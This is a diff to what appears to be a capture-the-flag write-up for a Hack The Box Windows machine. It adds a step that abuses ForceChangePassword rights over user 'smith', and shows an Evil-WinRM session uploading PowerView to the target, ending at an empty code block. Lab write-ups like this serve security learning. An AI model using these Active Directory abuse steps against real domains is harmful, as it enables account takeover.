@@ -391,4 +391,18 @@ I have ForceChangePassword on the user `smith`
 
 LDAP is not accessible via TCP so ill do all of this from the windows command line
 
-# Changing `smith` passq
+# Changing `smith` password
+```python
+*Evil-WinRM* PS C:\Users\oliver\Desktop> upload powerview.ps1
+                                        
+Info: Uploading /home/kali/htb/object/powerview.ps1 to C:\Users\oliver\Desktop\powerview.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
+```
+Ill start by uploading powerview
+
+```python
+
+```
